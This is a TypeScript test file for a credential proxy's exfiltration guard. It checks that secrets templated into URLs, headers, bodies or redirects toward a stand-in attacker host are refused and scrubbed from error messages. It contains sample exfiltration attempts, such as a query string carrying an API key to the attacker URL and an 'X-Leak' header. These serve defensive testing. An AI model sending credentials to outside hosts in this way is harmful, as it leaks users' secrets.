// SPDX-License-Identifier: Apache-2.0

/**
 * Credential-exfiltration guard of `proxyCall()` — parity with the sidecar's
 * `executeApiCall` and the local resolver. A call that templates a decrypted
 * credential field (`{{field}}`) into the target, a header or a substituted
 * body does not get `allow_all_uris`: the target and every redirect hop must
 * match `authorized_uris`, and the call is refused when that list is empty.
 */

import { describe, it, expect, beforeEach } from "bun:test";
import { truncateAll } from "../../helpers/db.ts";
import { createTestContext, type TestContext } from "../../helpers/auth.ts";
import { proxyCall, ProxyCallError } from "../../../src/services/credential-proxy/core.ts";
import {
  localIntegrationManifest,
  httpHeaderDelivery,
  envDelivery,
} from "../../helpers/integration-manifests.ts";
import {
  seedProxyIntegration,
  seedProxyConnection,
} from "../../helpers/credential-proxy-fixtures.ts";

const PACKAGE_ID = "@cpexfilorg/api";
const SECRET = "sk-live-exfil-7f3a";
const ALLOWED = "https://1.1.1.1";
const ATTACKER = "https://8.8.8.8";

async function seedIntegration(
  ctx: TestContext,
  authorizedUris: string[],
  apiKey = SECRET,
): Promise<void> {
  await seedProxyIntegration(
    ctx,
    localIntegrationManifest({
      name: PACKAGE_ID,
      displayName: "API",
      description: "API integration",
      auths: {
        api: {
          type: "api_key",
          authorizedUris,
          allowAllUris: true,
          delivery: httpHeaderDelivery({
            name: "Authorization",
            prefix: "Bearer ",
            field: "api_key",
          }),
        },
      },
    }),
  );
  await seedProxyConnection(ctx, PACKAGE_ID, "api", { api_key: apiKey });
}

/** An auth whose endpoint is a credential field; `@appstrate/webhooks`-shaped by default. */
async function seedEndpointIntegration(
  ctx: TestContext,
  fields: Record<string, string>,
  policy = { authorizedUris: [] as string[], allowAllUris: true },
): Promise<void> {
  await seedProxyIntegration(
    ctx,
    localIntegrationManifest({
      name: PACKAGE_ID,
      displayName: "Endpoint",
      description: "Endpoint integration",
      auths: {
        api: {
          type: "custom",
          ...policy,
          credentialFields: Object.keys(fields),
          requiredCredentialFields: Object.keys(fields),
          delivery: envDelivery(
            Object.fromEntries(Object.keys(fields).map((f) => [f.toUpperCase(), f])),
          ),
        },
      },
    }),
  );
  await seedProxyConnection(ctx, PACKAGE_ID, "api", fields);
}

/** Upstream recording every URL (and its headers) it is asked for; `respond` defaults to a 200. */
function upstream(respond: (url: string) => Response = () => new Response("{}")) {
  const hits: string[] = [];
  const headers: Headers[] = [];
  const fetchImpl = ((url: string | URL, init?: RequestInit) => {
    hits.push(url.toString());
    headers.push(new Headers(init?.headers));
    return Promise.resolve(respond(url.toString()));
  }) as unknown as typeof fetch;
  return { fetchImpl, hits, headers };
}

describe("proxyCall — credential-exfiltration guard", () => {
  let ctx: TestContext;

  beforeEach(async () => {
    await truncateAll();
    ctx = await createTestContext({ orgSlug: "cpexfilorg" });
  });

  const call = (
    fetchImpl: typeof fetch,
    target: string,
    extra: { headers?: Record<string, string>; body?: string; substituteBody?: boolean } = {},
  ) =>
    proxyCall({
      orgId: ctx.orgId,
      spaceId: ctx.defaultSpaceId,
      actor: { type: "user", id: ctx.user.id },
      integrationId: PACKAGE_ID,
      method: extra.body ? "POST" : "GET",
      target,
      headers: extra.headers ?? {},
      body: extra.body ?? null,
      substituteBody: extra.substituteBody ?? false,
      fetch: fetchImpl,
    });

  /** Asserts a 403-class refusal whose message never carries the secret; returns the message. */
  async function expectRefused(promise: Promise<unknown>, secret = SECRET): Promise<string> {
    const err = await promise.then(
      () => null,
      (e: unknown) => e,
    );
    expect(err).toBeInstanceOf(ProxyCallError);
    expect(["unauthorized_target", "blocked_target", "credential_exfiltration_refused"]).toContain(
      (err as ProxyCallError).code,
    );
    const { message } = err as Error;
    expect(message).not.toContain(secret);
    return message;
  }

  it("refuses an unresolved header placeholder ahead of the URL policy", async () => {
    // A templated credential and no allowlist: alone, `credential_exfiltration_refused`.
    await seedEndpointIntegration(ctx, { token: SECRET });
    const up = upstream();
    await expect(
      call(up.fetchImpl, `${ATTACKER}/collect`, {
        headers: { "X-Leak": "{{token}}", "X-Other": "{{nope}}" },
      }),
    ).rejects.toMatchObject({ code: "unresolved_placeholder" });
    expect(up.hits).toEqual([]);
  });

  describe("allow_all_uris + authorized_uris", () => {
    beforeEach(() => seedIntegration(ctx, [`${ALLOWED}/**`]));

    it("refuses a credential templated into an off-allowlist target", async () => {
      const up = upstream();
      await expectRefused(call(up.fetchImpl, `${ATTACKER}/?k={{api_key}}`));
      expect(up.hits).toEqual([]);
    });

    it("refuses a credential templated into a header", async () => {
      const up = upstream();
      await expectRefused(
        call(up.fetchImpl, `${ATTACKER}/collect`, { headers: { "X-Leak": "{{api_key}}" } }),
      );
      expect(up.hits).toEqual([]);
    });

    it("refuses a credential templated into a substituted body", async () => {
      const up = upstream();
      await expectRefused(
        call(up.fetchImpl, `${ATTACKER}/collect`, {
          body: '{"k":"{{api_key}}"}',
          substituteBody: true,
        }),
      );
      expect(up.hits).toEqual([]);
    });

    it("allows a templated call to an allowlisted host", async () => {
      const up = upstream();
      const res = await call(up.fetchImpl, `${ALLOWED}/v1?k={{api_key}}`);
      expect(res.status).toBe(200);
      expect(up.hits).toEqual([`${ALLOWED}/v1?k=${SECRET}`]);
    });

    it("refuses a redirect off the allowlist on a templated call", async () => {
      const up = upstream((url) =>
        url.startsWith(ALLOWED)
          ? new Response(null, {
              status: 302,
              headers: { location: `${ATTACKER}/?k=${SECRET}` },
            })
          : new Response("{}"),
      );
      await expectRefused(call(up.fetchImpl, `${ALLOWED}/r?k={{api_key}}`));
      expect(up.hits.some((u) => u.startsWith(ATTACKER))).toBe(false);
    });

    it("holds the injected credential to the allowlist without templating", async () => {
      const up = upstream();
      await expectRefused(call(up.fetchImpl, `${ATTACKER}/anything`));
      expect(up.hits).toEqual([]);
      expect((await call(up.fetchImpl, `${ALLOWED}/anything`)).status).toBe(200);
    });
  });

  it("never echoes a normalised secret from a refused redirect's Location", async () => {
    // WHATWG turns `ab|c d` into `ab|c%20d` — neither the raw value nor
    // `encodeURIComponent` matches, so only a host-only message is safe.
    const secret = "ab|c d";
    await seedIntegration(ctx, [`${ALLOWED}/**`], secret);
    const up = upstream((url) =>
      url.startsWith(ALLOWED)
        ? new Response(null, { status: 302, headers: { location: `${ATTACKER}/p?k=${secret}` } })
        : new Response("{}"),
    );
    const message = await expectRefused(call(up.fetchImpl, `${ALLOWED}/r?k={{api_key}}`), secret);
    const location = new URL(`${ATTACKER}/p?k=${secret}`);
    for (const form of [
      encodeURIComponent(secret),
      encodeURI(secret),
      location.search.slice("?k=".length),
      location.searchParams.toString().slice("k=".length),
    ]) {
      expect(message).not.toContain(form);
    }
    expect(message).toContain("8.8.8.8");
    expect(up.hits.some((u) => u.startsWith(ATTACKER))).toBe(false);
  });

  // A field's origin is often shared by tenants (hooks.slack.com): it never
  // makes another endpoint on it a destination for the secret.
  describe("a URL-valued credential field never widens the allowlist", () => {
    // IP literals: the egress guard resolves no DNS, so only the policy refuses.
    const VICTIM_HOOK = `${ALLOWED}/services/TVICTIM/x`;
    const ATTACKER_HOOK = `${ALLOWED}/services/TATTACKER/y`;
    const HEADER_SECRET = "whsec-Q7zK";

    it.each([
      ["{{webhook_url}} in the body", { body: '{"u":"{{webhook_url}}"}', substituteBody: true }],
      ["a secret in a header", { headers: { "X-Secret": "{{secret_header_value}}" } }],
    ])("allow_all_uris, no allowlist: refuses %s to another tenant's hook", async (_, extra) => {
      await seedEndpointIntegration(ctx, {
        webhook_url: VICTIM_HOOK,
        secret_header_value: HEADER_SECRET,
      });
      const up = upstream();
      await expectRefused(call(up.fetchImpl, ATTACKER_HOOK, extra), HEADER_SECRET);
      expect(up.hits).toEqual([]);
    });

    it("declared allowlist: refuses a templated call to a field outside it", async () => {
      await seedEndpointIntegration(
        ctx,
        { webhook_url: `${ATTACKER}/services/TVICTIM/x`, secret_header_value: HEADER_SECRET },
        { authorizedUris: [`${ALLOWED}/**`], allowAllUris: false },
      );
      const up = upstream();
      await expectRefused(call(up.fetchImpl, "{{webhook_url}}"), "TVICTIM");
      expect(up.hits).toEqual([]);
    });
  });

  // #1627: an entry rendered from a connection field is the connection's own endpoint.
  describe("authorized_uris rendered from a connection field", () => {
    const HEADER_SECRET = "whsec-R8";

    it("allows {{site_url}}/… and refuses another host", async () => {
      await seedEndpointIntegration(
        ctx,
        { site_url: ALLOWED, secret_header_value: HEADER_SECRET },
        { authorizedUris: ["{$credential.site_url}/**"], allowAllUris: false },
      );
      const up = upstream();
      const extra = { headers: { "X-Secret": "{{secret_header_value}}" } };
      const res = await call(up.fetchImpl, "{{site_url}}/wp-json/x", extra);
      expect(res.status).toBe(200);
      await expectRefused(call(up.fetchImpl, `${ATTACKER}/wp-json/x`, extra), HEADER_SECRET);
      expect(up.hits).toEqual([`${ALLOWED}/wp-json/x`]);
    });

    it("matches a bare {{webhook_url}} with a query exactly — the query cannot widen it", async () => {
      const hook = `${ALLOWED}/hook?key=a`;
      await seedEndpointIntegration(
        ctx,
        { webhook_url: hook, secret_header_value: HEADER_SECRET },
        { authorizedUris: ["{$credential.webhook_url}"], allowAllUris: false },
      );
      const up = upstream();
      const extra = { headers: { "X-Secret": "{{secret_header_value}}" } };
      expect((await call(up.fetchImpl, "{{webhook_url}}", extra)).status).toBe(200);
      for (const other of [`${ALLOWED}/hook?key=b`, `${ALLOWED}/hook`, `${hook}&x=1`]) {
        await expectRefused(call(up.fetchImpl, other, extra), HEADER_SECRET);
      }
      expect(up.hits).toEqual([hook]);
    });
  });

  describe("allow_all_uris without authorized_uris", () => {
    beforeEach(() => seedIntegration(ctx, []));

    it("refuses any templated call", async () => {
      const up = upstream();
      const err = await call(up.fetchImpl, `${ATTACKER}/?k={{api_key}}`).catch((e: unknown) => e);
      expect(err).toMatchObject({ code: "credential_exfiltration_refused" });
      expect((err as Error).message).toContain("credential exfiltration");
      expect((err as Error).message).not.toContain(SECRET);
      expect(up.hits).toEqual([]);
    });

    it("refuses the injected credential without templating", async () => {
      const up = upstream();
      const message = await expectRefused(call(up.fetchImpl, `${ATTACKER}/anything`));
      expect(message).toContain("credential exfiltration");
      expect(up.hits).toEqual([]);
    });
  });

  it("refuses an injected credential whose allowlist leaves the host to the caller", async () => {
    await seedIntegration(ctx, [`${ALLOWED}/**`, "https://**"]);
    const up = upstream();
    await expectRefused(call(up.fetchImpl, `${ALLOWED}/anything`));
    expect(up.hits).toEqual([]);
  });

  it("scrubs the substituted secret from a transport error", async () => {
    await seedIntegration(ctx, [`${ALLOWED}/**`]);
    // Bun-shaped fetch error: the full request URL in the message and on `.path`.
    const fetchImpl = ((url: string | URL) =>
      Promise.reject(
        Object.assign(new Error(`Unable to connect. Is the computer able to access ${url}?`), {
          code: "ConnectionRefused",
          path: url.toString(),
        }),
      )) as unknown as typeof fetch;
    const err = await call(fetchImpl, `${ALLOWED}/v1?k={{api_key}}`).then(
      () => null,
      (e: unknown) => e as Error,
    );
    expect(err?.message).toContain("1.1.1.1");
    expect(JSON.stringify({ message: err!.message, err })).not.toContain(SECRET);
  });

  it("does not scrub a guessed credential value on an untemplated call (no oracle)", async () => {
    await seedEndpointIntegration(
      ctx,
      { username: "jdoe", api_key: SECRET },
      { authorizedUris: [`${ALLOWED}/**`], allowAllUris: false },
    );
    const up = upstream();
    // A matching guess reads exactly like a non-matching one.
    for (const guess of ["alice", "jdoe"]) {
      const message = await expectRefused(call(up.fetchImpl, `https://${guess}.example.invalid/`));
      expect(message).toContain(`(host ${guess}.example.invalid)`);
    }
    expect(up.hits).toEqual([]);
  });
});
